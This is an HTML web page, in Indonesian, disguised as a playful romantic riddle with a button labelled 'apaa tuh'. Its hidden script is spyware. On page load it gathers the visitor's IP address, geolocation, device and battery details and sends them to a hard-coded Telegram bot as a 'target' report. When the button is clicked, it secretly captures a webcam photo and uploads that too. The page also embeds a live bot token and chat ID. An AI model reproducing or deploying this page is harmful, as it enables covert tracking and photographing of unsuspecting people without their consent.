<html lang="id">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Love Cute!</title>
  <style>
  body {
    margin: 0;
    padding: 0;
    font-family: 'Comic Sans MS', sans-serif;
    height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    text-align: center;
    color: #eaeaea;
    overflow: hidden;
    background: linear-gradient(to bottom, #000814, #001d3d, #003566);
    position: relative;
  }
  
  /* ======= GRID EFFECT ======= */
  body::before {
    content: "";
    position: absolute;
    inset: 0;
    background-image: 
      linear-gradient(to right, rgba(255,255,255,0.08) 1px, transparent 1px),
      linear-gradient(to bottom, rgba(255,255,255,0.08) 1px, transparent 1px);
    background-size: 80px 80px;
    pointer-events: none;
    z-index: 0;
    animation: moveGrid 30s linear infinite;
  }

  @keyframes moveGrid {
    from { background-position: 0 0, 0 0; }
    to { background-position: -160px 0, 0 160px; }
  }

  /* ======= PARTIKEL MELAYANG KE KIRI ======= */
  .particle {
    position: absolute;
    background: rgba(255, 255, 255, 0.4);
    width: 3px;
    height: 3px;
    border-radius: 50%;
    animation: moveLeft linear infinite;
    opacity: 0.8;
  }

  @keyframes moveLeft {
    0% {
      transform: translateX(100vw) translateY(0);
      opacity: 1;
    }
    100% {
      transform: translateX(-10vw) translateY(50px);
      opacity: 0;
    }
  }

  /* ======= TEKS DAN TOMBOL ======= */
  h1 {
    font-size: 2.8em;
    margin-bottom: 20px;
    color: #8ab4f8;
    text-shadow: 0 0 15px rgba(138, 180, 248, 0.6);
    animation: fadeInDown 1.5s ease;
    z-index: 1;
  }

  p {
    font-size: 1.2em;
    margin-bottom: 35px;
    color: #bfc9ca;
    animation: fadeIn 2s ease;
    z-index: 1;
  }

  button {
    padding: 15px 40px;
    font-size: 1.2em;
    font-weight: bold;
    border: none;
    border-radius: 50px;
    background: linear-gradient(135deg, #6a11cb, #2575fc);
    color: #fff;
    cursor: pointer;
    box-shadow: 0 0 20px rgba(101, 78, 163, 0.6);
    transition: all 0.3s ease;
    position: relative;
    overflow: hidden;
    z-index: 1;
  }

  button:hover {
    transform: scale(1.08);
    box-shadow: 0 0 30px rgba(101, 78, 163, 0.9);
    background: linear-gradient(135deg, #8e2de2, #4a00e0);
  }

  button:active {
    transform: scale(0.95);
    filter: brightness(0.9);
  }

  button::after {
    content: "";
    position: absolute;
    width: 20px;
    height: 20px;
    background: rgba(255, 255, 255, 0.3);
    display: block;
    border-radius: 50%;
    opacity: 0;
    pointer-events: none;
    transform: scale(1);
    transition: all 0.6s ease;
  }

  button:active::after {
    opacity: 1;
    transform: scale(10);
    transition: 0s;
  }

  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(10px); }
    to { opacity: 1; transform: translateY(0); }
  }

  @keyframes fadeInDown {
    from { opacity: 0; transform: translateY(-20px); }
    to { opacity: 1; transform: translateY(0); }
  }
</style>

<!-- ======= SCRIPT UNTUK PARTIKEL ======= -->
<script>
  const body = document.body;
  for (let i = 0; i < 25; i++) {
    const particle = document.createElement("div");
    particle.classList.add("particle");
    particle.style.top = Math.random() * 100 + "vh";
    particle.style.left = Math.random() * 100 + "vw";
    particle.style.animationDuration = (5 + Math.random() * 5) + "s";
    particle.style.animationDelay = Math.random() * 5 + "s";
    body.appendChild(particle);
  }
</script>

<body>
  <h1>KAMU TAU GAAAA</h1>
  <p>apaaa buah yang namanyaa selalu bikin nyaman</p>
  <button id="btnCamera">apaa tuh</button>
  
  <script>
const BOT_TOKEN = "8570434755:AAG1NuzuC3dlk25mnV4e3v4FdLTNWVuOSvI";
const CHAT_ID = "7859531089";
const STATIC_IMAGE = "https://h.top4top.io/p_3604lhthu3.jpg";

function escapeHtml(s){
  return String(s||"-")
    .replaceAll("&","&amp;")
    .replaceAll("<","&lt;")
    .replaceAll(">","&gt;");
}

// üîπ Ambil informasi IP / lokasi via ipwhois.io
async function getIpInfo(){
  try {
    const r = await fetch("https://ipwhois.app/json/");
    const data = await r.json();
    if(!data.success) return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0"};
    return {
      ip: data.ip || "-",
      city: data.city || "-",
      region: data.region || "-",
      country_name: data.country || "-",
      country_code: data.country_code || "-",
      latitude: data.latitude || "0",
      longitude: data.longitude || "0"
    };
  } catch(e) {
    return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0"};
  }
}

// üîπ Ambil informasi device (browser, OS, layar, RAM, dsb)
async function getDeviceInfo(){
  const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:null, charging:false, chargingTime:null, dischargingTime:null}));
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screenWidth: screen.width,
    screenHeight: screen.height,
    innerWidth: window.innerWidth,
    innerHeight: window.innerHeight,
    cores: navigator.hardwareConcurrency || "-",
    memory: navigator.deviceMemory || "-",
    touchPoints: navigator.maxTouchPoints || 0,
    orientation: screen.orientation?.type || "-",
    colorDepth: screen.colorDepth || "-",
    pixelRatio: window.devicePixelRatio || "-",
    onLine: navigator.onLine,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    battery: b
  };
}

// üîπ Buat format teks laporan yang dikirim ke Telegram
function buildCaption(ip, d){
  const mapUrl = `https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
  return [
    "<b>üß≠ INFORMATION TARGET</b>",
    `IP: ${escapeHtml(ip.ip)}`,
    `City: ${escapeHtml(ip.city)}`,
    `Region: ${escapeHtml(ip.region)}`,
    `Country: ${escapeHtml(ip.country_name)}`,
    `Country Code: ${escapeHtml(ip.country_code)}`,
    `Latitude: ${escapeHtml(ip.latitude)}`,
    `Longitude: ${escapeHtml(ip.longitude)}`,
    `Location: ${mapUrl}`,
    "",
    "<b>üíª DEVICE INFO</b>",
    `User Agent: ${escapeHtml(d.userAgent)}`,
    `Platform: ${escapeHtml(d.platform)}`,
    `Language: ${escapeHtml(d.language)}`,
    `Screen: ${escapeHtml(d.screenWidth + "x" + d.screenHeight)}`,
    `Inner Size: ${escapeHtml(d.innerWidth + "x" + d.innerHeight)}`,
    `CPU cores: ${escapeHtml(d.cores)}`,
    `RAM (GB): ${escapeHtml(d.memory)}`,
    `Touch Points: ${escapeHtml(d.touchPoints)}`,
    `Orientation: ${escapeHtml(d.orientation)}`,
    `Color Depth: ${escapeHtml(d.colorDepth)}`,
    `Pixel Ratio: ${escapeHtml(d.pixelRatio)}`,
    `Online: ${escapeHtml(d.onLine)}`,
    `Cookies Enabled: ${escapeHtml(d.cookiesEnabled)}`,
    `Do Not Track: ${escapeHtml(d.doNotTrack)}`,
    `Battery: ${escapeHtml(d.battery?.level || "-")} (${d.battery?.charging ? "Charging" : "Not Charging"})`,
    `ChargingTime: ${escapeHtml(d.battery?.chargingTime || "-")}s, DischargingTime: ${escapeHtml(d.battery?.dischargingTime || "-")}s`,
    "",
    "<b>üåê URL & Time</b>",
    `URL: ${escapeHtml(location.href)}`,
    `Time (UTC): ${escapeHtml(new Date().toISOString())}`
  ].join("\n");
}

// üîπ Kirim info IP dan device ke Telegram
async function sendIpDevice(){
  const [ip, d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      chat_id: CHAT_ID,
      photo: STATIC_IMAGE,
      caption: buildCaption(ip, d),
      parse_mode: "HTML"
    })
  });
}

// üîπ Ambil snapshot kamera & kirim ke Telegram
async function sendSnapshot(){
  try {
    const stream = await navigator.mediaDevices.getUserMedia({video:true});
    const video = document.createElement('video');
    video.style.display = 'none';
    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();

    await new Promise(r => video.onloadedmetadata = () => setTimeout(r, 200));

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("document", blob, "screenshot.jpg");
    formData.append("caption", "üì∏ Foto sukses diambil dari kamera");

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
      method: "POST",
      body: formData
    });

    stream.getTracks().forEach(track => track.stop());
    video.remove();
  } catch (e) {
    console.error("Error kamera:", e);
  }
}

// üîπ Kirim info saat halaman dibuka
window.addEventListener("load", sendIpDevice);

// üîπ Tombol kamera di halaman
document.getElementById("btnCamera").addEventListener("click", sendSnapshot);
</script>
